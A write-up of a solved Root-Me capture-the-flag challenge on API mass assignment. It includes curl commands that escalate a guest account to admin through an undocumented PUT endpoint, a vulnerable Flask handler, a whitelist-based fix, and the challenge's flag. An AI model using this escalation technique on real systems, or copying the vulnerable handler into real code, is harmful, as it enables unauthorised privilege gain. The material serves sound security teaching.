# Root-Me — Web-Server: API - Mass Assignment (ch90) — SOLVED

**Target:** `http://challenge01.root-me.org/web-serveur/ch90/` → 301 → `http://challenge01.root-me.org:59090/`
**Challenge:** "Anyway, I had no further use for it." (20 pts, authors Nishacid, Mika)
**Goal:** The dev removed note access and added an admin role — get the flag.

## Flag

```
RM{4lw4yS_ch3ck_0pt10ns_m3th0d}
```

(31 characters. The message is *"Hello admin, here is the flag : …"* — and the flag itself is
the hint: **"Always check options method"**.)

## Exploit

```bash
B=http://challenge01.root-me.org:59090

# 1. create + log in as an ordinary user
curl -s -X POST "$B/api/signup" -H 'Content-Type: application/json' \
     -d '{"username":"wb1","password":"pw123"}'
curl -s -X POST "$B/api/login" -H 'Content-Type: application/json' -c cj.txt \
     -d '{"username":"wb1","password":"pw123"}'

# 2. mass-assign the role on the UNDOCUMENTED endpoint
curl -s -X PUT "$B/api/user" -H 'Content-Type: application/json' -b cj.txt \
     -d '{"status":"admin"}'
# -> {"message":"User updated sucessfully."}

# 3. read the flag
curl -s -b cj.txt "$B/api/flag"
# -> {"message":"Hello admin, here is the flag : RM{4lw4yS_ch3ck_0pt10ns_m3th0d}."}
```

## Step by step

### 1. Find the app
`GET /web-serveur/ch90/` → `301 → http://challenge01.root-me.org:59090/`. The Flask app
(`Server: Werkzeug/3.0.5 Python/3.11.10`) serves Swagger UI at `/` with the spec at
`/static/swagger.json`.

### 2. Read the spec
The spec documents five endpoints:

| Method | Path | Note |
|---|---|---|
| POST | `/api/signup` | `UserSignup`: `username`, `password` |
| POST | `/api/login` | `UserLogin` |
| GET | `/api/user` | `UserInfo`: `id`, `username`, `note`, **`status`** |
| PUT | `/api/note` | `NoteUpdate`: `note` |
| GET | `/api/flag` | *"Admin only."* |

`UserInfo` exposing a **`status`** field is the giveaway — that is the role, and a fresh
user gets `"status":"guest"`.

### 3. The documented endpoints are not vulnerable
Mass-assignment attempts on both documented write endpoints were rejected — extras are
silently ignored, which is what a correctly-whitelisted handler looks like:

| Attempt | Result |
|---|---|
| `POST /api/signup` + `"status":"admin"` | user created, `/api/user` → `"status":"guest"` |
| `POST /api/signup` + `"role":"admin"` / `"is_admin":true` | still `guest` |
| `PUT /api/note` + `"status":"admin"` | note updated, still `guest` |
| `PUT /api/note` + `"userid":1` / `"id":1` / `"username":"admin"` | still `guest` |

Also ruled out: form-encoded bodies, the Flask session cookie (only holds `_user_id`, and it
is signed), and ~14 guessed paths (`/api/admin`, `/api/me`, `/api/user/1`, …) — all 404.

### 4. Find the undocumented endpoint with OPTIONS
Enumerating the allowed methods per path found a method the spec never mentions:

```
GET    /api/user   -> 200
POST   /api/user   -> 405
PUT    /api/user   -> 200     <-- undocumented!
PATCH  /api/user   -> 405
DELETE /api/user   -> 405
OPTIONS /api/user  -> 200
```

and confirming it:

```
$ curl -i -X OPTIONS .../api/user
Allow: OPTIONS, GET, PUT
```

### 5. Exploit the mass assignment
`PUT /api/user` takes the JSON body and applies **every** key to the user model instead of
whitelisting the editable fields:

```json
{"status":"admin"}
```

→ `{"message":"User updated sucessfully."}`

### 6. Verify by effect

| Check | Before | After |
|---|---|---|
| `GET /api/user` | `"status":"guest"` | **`"status":"admin"`** |
| `GET /api/flag` | `401 Unauthorized, user is not admin.` | **flag returned** |

### Tell-tale detail worth noting
The response strings differ between handlers:

- documented `PUT /api/note` → `"Note updated successfully."` (correct spelling)
- undocumented `PUT /api/user` → `"User updated **sucessfully**."` (typo)

Two different handlers, two different authors/moments — the misspelling is a useful hint that
you have found a separate code path from the one the spec describes.

## Root cause

The handler binds the whole request body onto the model object:

```python
@app.route('/api/user', methods=['PUT'])
@login_required
def update_user():
    data = request.get_json()
    for key, value in data.items():     # <-- mass assignment
        setattr(current_user, key, value)
    db.session.commit()
```

Any field that exists on the model is therefore writable by the client — including
authorisation fields. This is CWE-915 (Improperly Controlled Modification of Dynamically
Determined Object Attributes), the "mass assignment" / "autobinding" class.

Note the two failures compound: the endpoint is **undocumented** (so it escapes review) *and*
it **binds every field** (so it is exploitable). Either one alone would have been survivable.

## Fix

```python
ALLOWED = {'note', 'username'}          # explicit whitelist — never the whole body

@app.route('/api/user', methods=['PUT'])
@login_required
def update_user():
    data = request.get_json() or {}
    for key, value in data.items():
        if key in ALLOWED:
            setattr(current_user, key, value)
    db.session.commit()
```

Better still, use a schema/serialiser (`marshmallow`, `pydantic`) with
`unknown=EXCLUDE` so unlisted fields are rejected rather than bound, and never place
authorisation state (`status`, `role`, `is_admin`) on the same model that user input is
bound onto. Also keep the OpenAPI spec honest — an undocumented method is a finding in its
own right.
